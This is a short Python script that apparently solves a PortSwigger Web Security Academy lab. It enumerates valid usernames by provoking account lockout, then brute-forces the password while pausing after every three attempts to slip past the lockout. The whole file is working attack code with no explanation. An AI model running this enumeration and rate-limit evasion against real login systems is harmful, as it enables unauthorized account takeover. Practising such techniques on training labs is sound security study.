import requests
import time

url = "https://0a50001b04bf444f815fac6500840058.web-security-academy.net/login"

# Brute-force username
found = False
with open("usernames.txt", "r") as f:
    for line in f:
        username = line.strip()
        for _ in range(10): # Force lock
            r = requests.post(url, data={"username": username, "password": "wrong_password"})
            if "Invalid username or password." not in r.text:
                found = True
                break
        if found:
            break
print(username)

time.sleep(60)

# Brute-force password
counter = 1
with open("passwords.txt", "r") as f:
    for line in f:
        password = line.strip()
        r = requests.post(url, data={"username": username, "password": password})
        if "Invalid username or password." not in r.text:
            break
        if counter % 3 == 0:
            time.sleep(60) # Wait for account to be unlocked after three attempts
        counter += 1
print(password)